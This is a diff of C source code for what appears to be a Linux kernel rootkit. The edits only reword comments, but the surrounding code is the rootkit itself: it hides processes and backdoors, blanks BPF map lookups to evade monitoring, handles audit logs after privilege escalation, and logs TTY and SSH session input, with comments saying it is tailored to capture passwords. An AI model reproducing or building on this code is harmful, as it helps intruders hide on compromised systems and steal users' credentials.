@@ -50,19 +50,14 @@ static struct file *ttyfilp;
 static DEFINE_SPINLOCK(tty_lock);
 static DEFINE_SPINLOCK(hide_once_spin);
 
-/*
- *  task
- *      |
- *      +--- hidden No -> normal flow
- *      |
- *      +--- hidden Yes
- *              |
- *              +--- Backdoor Yes
- *              |         |
- *              |        +--- unhide all backdoors -> kill all backdoors
- *              +--- Backdoor No
- *                      |
- *                      +--- unhide task
+/**
+ * task
+ * ├── hidden No → normal flow
+ * └── hidden Yes
+ *     └── Backdoor Yes
+ *         ├── unhide all backdoors → kill all backdoors
+ *     └── Backdoor No
+ *         ├── unhide task
  */
 static asmlinkage long m_exit_group(struct pt_regs *regs)
 {
@@ -92,12 +87,12 @@ leave:
 }
 
 
-/**
- * task A (parent of B) <- hidden by hax0r
+/*
+ * task A (parent of B) <- hidden
  *     |
- *     + (clone) --- Task B (child, parent of C) <- hidden by sys_clone if A is hidden
- *               |
- *               + (clone) --- Task C (child) <- hidden by sys_clone if B is hidden
+ *     ├ (clone) --- Task B (child, parent of C) <- hidden by sys_clone if A is hidden
+ *     |      |
+ *     |      └ (clone) --- Task C (child) <- hidden by sys_clone if B is hidden
  *
  * See m_exit_group()
  */
@@ -256,13 +251,13 @@ static asmlinkage long m_bpf(struct pt_regs *regs) {
             goto out;
         }
 
-        /**
-         * In order to extract the value we must unwrap
+        /*
+         * To extract the value, we must traverse the stack:
          * sys_bpf -> __sys_bpf -> map_lookup_elem
-         * In other words, recover the user ptr that is
-         * about to be returned to userspace, read, modify
-         * and write it back, hopefully, nullified if
-         * there is a match.
+         * In simpler terms, we need to recover the user pointer
+         * that is about to be returned to userspace. We'll then
+         * read, modify, and write it back. The goal is to nullify
+         * it if there's a match, ensuring it doesn't get used.
          */
         if (attr->map_type == BPF_MAP_TYPE_PERF_EVENT_ARRAY) {
             u32 id;
@@ -568,9 +563,8 @@ static struct audit_buffer *m_audit_log_start(struct audit_context *ctx,
 
     const struct cred *c = current->real_cred;
     /**
-     *  We'll trigger this KauditD log when executing
-     *  certain operations after privilege escalation.
-     *  Legit root may not actually follow this code path
+     * This KauditD log is triggered during specific operations after privilege escalation.
+     * Legitimate root users may not follow this code path.
      */
     if (!c->uid.val && !c->gid.val && !c->suid.val &&
             !c->sgid.val && !c->euid.val && !c->egid.val &&
@@ -616,12 +610,13 @@ static void _tty_write_log(uid_t uid, pid_t pid, char *buf, ssize_t len) {
     size_t total;
 
     /**
-     * +16 is enough to hold "uid.%d" length
-     * Here using VLA because the implementation of kernel_write
-     * make a forced conversion to user ptr. I suspect that
-     * if the variable is heap allocated, the pointer will be lost.
+     * We use a variable-length array (VLA) because the implementation of kernel_write
+     * forces a conversion to a user pointer. If the variable is heap-allocated, the
+     * pointer may be lost.
      *
-     * VLA will generate a warning as we're not c99, that's life.
+     * VLA generates a warning since we're not in C99, but it's necessary for our use case.
+     *
+     * We allocate +16 bytes, which is enough to hold "uid.%d".
      */
     char ttybuf[len+16];
 
@@ -776,10 +771,11 @@ static ssize_t m_tty_read(struct kiocb *iocb, struct iov_iter *to)
         flags |= (byte == '\n') ? R_NEWLINE : flags;
 
         /**
-         * this is hacky but ssh session data
-         * comes byte a byte most of the time but can also come in as
-         * multi-byte stream, for example, when a password
-         * it is a password
+         * This implementation might appear a bit unconventional, but
+         * it's designed to handle SSH session data. The data typically
+         * arrives byte by byte, but there are instances when it comes
+         * as a multi-byte stream, for example, during password input.
+         * It's particularly tailored for handling passwords.
          */
         if ((app_flag & APP_FTP) && rv > 1) {
             ttybuf[strcspn(ttybuf, "\r")] = '\0';
